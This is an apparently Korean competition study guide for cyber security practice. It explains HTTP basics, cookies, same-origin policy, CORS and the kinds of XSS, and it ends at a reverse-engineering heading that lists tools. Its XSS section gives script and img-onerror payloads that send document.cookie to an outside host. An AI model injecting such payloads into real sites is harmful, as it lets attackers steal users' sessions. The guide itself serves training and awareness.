---

# 🛡 사이버 보안 *Cyber Security* 🔐
## 🖋 *Written by **Donghyun Choi*** (**KGU**)
###### ⚔ - Worldskills Korea ▫ National 2025 (Cyber Security Practice) - 🏹 [ *Written by NullBins* ]
- By default, Solves problems using only Kali Linux.
- ❗❗ **Never attempt to use this guide on a commercial site or server. You do so at your own risk.** ❗❗
- ❗❗ **절대로 이 가이드를 보고 상용 중인 사이트나 서버에 시도하지 마십시오. 해당행위로 생기는 책임은 본인에게 있습니다.** ❗❗

# [ *Project-3* ] <*⚔Hacking Guides🛠*>

---

## 1. 🌐웹 해킹 (Web Hacking)
- **HTTP 헤더 (HTTP Header)**: HTTP 헤더의 각 줄은 `CRLF`로 구분되며, 첫 줄은 `Start Line`, 나머지 줄은 `Header`라고 부른다. 헤더의 끝 줄은 빈 줄로 나타낸다.
- **CRLF**: `CR(Carriage Return)`과 `LF(Line Feed)`의 조합을 나타낸다. **CR**은 커서를 현재 줄의 맨 앞으로 이동시키는 문자, **LF**는 커서 다음 줄로 문자이다.
- 윈도우에서는 줄을 종결하기 위해 `CRLF`를 사용하고, 리눅스나 유닉스 기반 운영체제에서는 `LF`만을 사용한다.
- **HTTP 요청의 시작줄**은 `메소드(Method)`, `요청 대상(Request Target)`, `HTTP 버전`으로 구성된다. (ex. POST /login HTTP/1.1)
- **URL(Uniform Resource Locator)**: `웹에 있는 리소스의 위치`를 표현하는 문자열이다.
- **URL**은 http(`schema`)://cybersecurity.skills:8080(`authority`)/login(`path`)?id=user01(`query`)#name(`fragment`) 로 표현된다.
- **Fragment**는 *메인* 리소스에 존재하는 *서브* 리소스에 접근할때 이를 식별하기 위한 정보를 담고있다.
### **쿠키 생성 JavaScript 명령어**
```javascript
document.cookie = "name=test;"
document.cookie = "age=30;"
```
- **SOP(Same Origin Policy)** 란 동일 출처 정책으로서 보안 메커니즘이다. 이걸 사용하는 이유는 *브라우저는 웹 리소스를 통해 간접적으로 `타 사이트를 접근할때`도 인증 정보인 쿠키를 함께 전송하는 특징때문이다.*
- 이 SOP를 적용하게 되면 `스키마`, `호스트`, `포트`만 달라도 Cross Origin으로 인식하게 된다. 오로지 Path만 허용하게 된다.
- 예를들어 `https://meister.hrdkorea.or.kr` 이라는 사이트에 접속하여 밑에 있는 명령어를 입력하게 되면 SOP가 적용되어 있는 사이트의 경우 `Origin 오류`가 생긴다.
### Cross Origin 공격
```javascript
crossNewWindow = window.open('http://www.world-skills.kr');
console.log(crossNewWindow.location.href);
```
- 하지만 밑의 명령어 처럼 데이터를 쓰는것은 문제없이 동작한다.
### 데이터 쓰기
```javascript
crossNewWindow = window.open('http://www.world-skills.kr');
crossNewWindow.location.href = "https://meister.hrdkorea.or.kr";
```
- 사이트의 호스트가 달라 SOP때문에 정보를 교환하지 못할때 이러한 Cross Origin 정책을 완화시켜주는 방식은 `CORS(Cross Origin Resource Sharing)`이다.
- **Stored XSS**: `악성 스크립트가 서버에 저장`되고 `서버 응답에 담겨오는` XSS
- **Reflected XSS**: `악성 스크립트가 URL에 저장`되고 `서버 응답에 담겨오는` XSS
- **DOM-Based XSS**: `악성 스크립트가 URL Fragment에 저장`되는 XSS
- **Universal XSS**: 브라우저 플러그인 취약점으로 `SOP 정책을 우회하는` XSS
### XSS 스크립트
```html
<script>
document.cookie;
alert(document.cookie);
document.cookie = "name=test;";
new Image().src = "https://meister.hrdkorea.or.kr?cookie=" + document.cookie;
document;
document.write = "You have been Hacked!";
</script>
<img src="XSS" onerror="location.href = '?cookie=' + document.cookie">
```

---

## 2. 🛠리버스 엔지니어링 (Reverse Engineering)
- 도구: radare2, ghidra, gdb, objdump
